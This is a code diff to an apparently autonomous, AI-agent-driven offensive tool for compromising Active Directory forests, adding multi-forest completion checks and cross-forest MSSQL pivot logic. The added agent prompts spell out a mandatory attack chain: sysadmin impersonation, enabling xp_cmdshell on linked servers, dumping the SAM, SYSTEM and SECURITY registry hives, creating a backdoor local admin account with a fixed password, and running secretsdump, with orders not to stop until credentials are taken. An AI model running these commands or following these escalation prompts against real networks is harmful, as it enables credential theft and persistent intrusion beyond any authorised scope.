@@ -932,6 +932,8 @@ async def run_multi_agent_operation(
         # Check if DA was already achieved (e.g., recovery after restart) and should stop
         # These modes are mutually exclusive (validated in config)
         if dispatcher.shared_state.has_domain_admin:
+            from ares.core.config import get_multi_forest_mode
+
             if get_stop_on_domain_admin():
                 # Single-domain mode: stop on first DA
                 logger.info("DA already achieved and stop_on_domain_admin=True; marking complete")
@@ -1121,13 +1123,26 @@ async def run_multi_agent_operation(
             and not dispatcher.shared_state.pending_tasks
             and not dispatcher.shared_state.completed
         ):
+            from ares.core.config import get_multi_forest_mode
+
             pending_plaintext = bool(
                 getattr(dispatcher.shared_state, "pending_credential_findings", set())
+            )
+            # In multi-forest mode, don't mark complete if foreign forests are undominated
+            multi_forest_active = (
+                get_multi_forest_mode() and not dispatcher.shared_state.all_forests_dominated()
             )
             if pending_plaintext:
                 logger.warning(
                     f"Orchestrator stopped ({stop_reason}) but pending plaintext credentials exist; "
                     "keeping operation open"
+                )
+            elif multi_forest_active:
+                undominated = dispatcher.shared_state.get_undominated_forests()
+                logger.warning(
+                    f"Orchestrator stopped ({stop_reason}) but multi-forest mode active "
+                    f"with {len(undominated)} undominated forest(s): {', '.join(undominated)}; "
+                    "keeping operation open for background workflows"
                 )
             else:
                 dispatcher.shared_state.completed = True
@@ -1139,11 +1154,22 @@ async def run_multi_agent_operation(
         if not dispatcher.shared_state.completed:
             has_pending_vulns = bool(exploitation_status.get("pending"))
             if not dispatcher.shared_state.pending_tasks and not has_pending_vulns:
+                from ares.core.config import get_multi_forest_mode as _get_mf_mode
+
                 pending_plaintext = bool(
                     getattr(dispatcher.shared_state, "pending_credential_findings", set())
                 )
+                multi_forest_active = (
+                    _get_mf_mode() and not dispatcher.shared_state.all_forests_dominated()
+                )
                 if pending_plaintext:
                     logger.warning("Pending plaintext credentials exist; keeping operation open")
+                elif multi_forest_active:
+                    undominated = dispatcher.shared_state.get_undominated_forests()
+                    logger.warning(
+                        f"Multi-forest mode: {len(undominated)} undominated forest(s) "
+                        f"({', '.join(undominated)}); keeping operation open"
+                    )
                 else:
                     dispatcher.shared_state.completed = True
                     if stop_reason == "error":
@@ -6083,24 +6109,74 @@ async def _auto_cross_forest_pivot(
                         f"with {len(sql_creds)} credentials"
                     )
 
+                    # Extract MSSQL port from services (named instances may use non-1433)
+                    mssql_port = 1433
+                    for svc in host.services:
+                        svc_lower = svc.lower()
+                        if any(ind in svc_lower for ind in ("mssql", "ms-sql", "sqlserver")):
+                            import re as _re
+
+                            _pm = _re.match(r"(\d+)/", svc)
+                            if _pm:
+                                mssql_port = int(_pm.group(1))
+                                break
+
+                    port_note = (
+                        f" MSSQL is on port {mssql_port} (non-standard) — pass port={mssql_port} to all mssql_ tools."
+                        if mssql_port != 1433
+                        else ""
+                    )
+
+                    # Identify known sysadmins from existing MSSQL vuln data
+                    known_sysadmins: list[str] = []
+                    for vuln in state.discovered_vulnerabilities.values():
+                        if vuln.target == host.ip and vuln.vuln_type == "mssql_impersonation":
+                            acct = vuln.details.get("account_name", "")
+                            if acct:
+                                known_sysadmins.append(acct)
+                    # Also check credentials known to be admin
+                    for sc in sql_creds:
+                        if sc.get("is_admin") == "True" and sc["username"] not in known_sysadmins:
+                            known_sysadmins.append(sc["username"])
+
+                    sysadmin_note = ""
+                    if known_sysadmins:
+                        sysadmin_note = (
+                            f" KNOWN SYSADMIN/ADMIN USERS: {', '.join(known_sysadmins)} — "
+                            f"USE THESE FIRST, they connect as sysadmin without needing impersonation."
+                        )
+
                     # Queue as a high-priority exploit — the linked server is the path
                     pivot_details: dict[str, Any] = {
                         "hostname": host.hostname,
                         "services": host.services,
+                        "mssql_port": mssql_port,
                         "available_credentials": sql_creds,
                         "note": (
                             f"CRITICAL CROSS-FOREST PIVOT: This MSSQL server in {host_domain} "
-                            f"likely has linked servers to {foreign_domain}. "
+                            f"likely has linked servers to {foreign_domain}.{port_note}{sysadmin_note} "
                             f"Known foreign MSSQL hosts: {', '.join(foreign_targets) if foreign_targets else 'unknown — enumerate them'}. "
-                            f"ATTACK CHAIN: "
-                            f"1) Connect with each credential below (Windows auth). "
+                            f"MANDATORY ATTACK CHAIN (follow ALL steps in order): "
+                            f"1) Connect with each credential below (Windows auth, port={mssql_port}). "
                             f"2) mssql_enum_impersonation — check EXECUTE AS rights to sa/other users. "
-                            f"3) If impersonation found: mssql_impersonate to escalate to sysadmin. "
+                            f"3) MANDATORY: If impersonation found, you MUST call mssql_impersonate BEFORE "
+                            f"attempting linked server queries. Without impersonation, linked servers "
+                            f"will connect as ANONYMOUS LOGON and fail. "
                             f"4) mssql_enum_linked_servers — find cross-forest linked servers. "
                             f"5) mssql_linked_enable_xpcmdshell on the foreign linked server. "
-                            f"6) mssql_linked_xpcmdshell — execute 'whoami', 'ipconfig', 'net user /domain' on foreign host. "
-                            f"7) Extract credentials: run secretsdump or dump SAM from the foreign host. "
-                            f"TRY ALL CREDENTIALS — one of them is sysadmin or can impersonate sa."
+                            f"6) mssql_linked_xpcmdshell — execute 'whoami /all', 'ipconfig /all', "
+                            f"'net user /domain', 'net group \"Domain Admins\" /domain' on foreign host. "
+                            f"7) Use mssql_linked_xpcmdshell to dump credentials: "
+                            f"'reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save && "
+                            f"reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.save && "
+                            f"reg save HKLM\\SECURITY C:\\Windows\\Temp\\sec.save'. "
+                            f"8) Create a local admin for remote access: "
+                            f"'net user ares_admin P@ssw0rd123! /add && "
+                            f"net localgroup Administrators ares_admin /add'. "
+                            f"Then use secretsdump with ares_admin against this host to dump all creds. "
+                            f"DO NOT STOP after enumerating linked servers — you MUST get RCE and extract creds. "
+                            f"TRY ALL CREDENTIALS — one of them is sysadmin or can impersonate sa. "
+                            f"If Windows auth fails with 'untrusted domain', try windows_auth=False (SQL auth)."
                         ),
                     }
 
@@ -6129,14 +6205,34 @@ async def _auto_cross_forest_pivot(
                         f"foreign host {fhost.hostname} ({fhost.ip}) with {len(sql_creds)} credentials"
                     )
 
+                    # Extract MSSQL port from foreign host services
+                    fhost_mssql_port = 1433
+                    for svc in fhost.services:
+                        svc_lower = svc.lower()
+                        if any(ind in svc_lower for ind in ("mssql", "ms-sql", "sqlserver")):
+                            import re as _re
+
+                            _pm = _re.match(r"(\d+)/", svc)
+                            if _pm:
+                                fhost_mssql_port = int(_pm.group(1))
+                                break
+
+                    fport_note = (
+                        f" MSSQL port: {fhost_mssql_port} — pass port={fhost_mssql_port} to all mssql_ tools."
+                        if fhost_mssql_port != 1433
+                        else ""
+                    )
+
                     direct_details: dict[str, Any] = {
                         "hostname": fhost.hostname,
                         "services": fhost.services,
+                        "mssql_port": fhost_mssql_port,
                         "available_credentials": sql_creds,
                         "note": (
-                            f"CROSS-FOREST MSSQL TARGET in {foreign_domain}. "
+                            f"CROSS-FOREST MSSQL TARGET in {foreign_domain}.{fport_note} "
                             f"Forest trust allows Windows auth from dominated domains. "
                             f"Try ALL credentials below — some may authenticate via trust. "
+                            f"If Windows auth fails with 'untrusted domain', try windows_auth=False (SQL auth). "
                             f"Check impersonation rights, linked servers back to dominated domain, "
                             f"and enable xp_cmdshell for RCE. "
                             f"Any command execution here = foothold in {foreign_domain}."
@@ -6854,7 +6950,22 @@ async def _wait_for_completion(
                             pass  # Dedup handles duplicates; errors logged inside
             else:
                 # Either not multi-forest mode, or all forests dominated
+                # Note: all_forests_dominated() can return True prematurely if DA achieved
+                # before foreign domains discovered. In multi-forest mode, use a grace period.
                 if get_multi_forest_mode():
+                    # Check if we should wait for foreign domain discovery
+                    if not hasattr(_wait_for_completion, "_mf_grace_start"):
+                        _wait_for_completion._mf_grace_start = asyncio.get_event_loop().time()
+                        logger.info(
+                            "Multi-forest mode: all forests appear dominated, "
+                            "waiting 300s for foreign domain discovery before declaring complete"
+                        )
+                    _mf_elapsed = (
+                        asyncio.get_event_loop().time() - _wait_for_completion._mf_grace_start
+                    )
+                    if _mf_elapsed < 300:
+                        await asyncio.sleep(5.0)
+                        continue
                     dominated = dispatcher.shared_state.domain_admin_domains
                     logger.success(
                         f"All forests dominated ({', '.join(dominated)})! Operation complete."
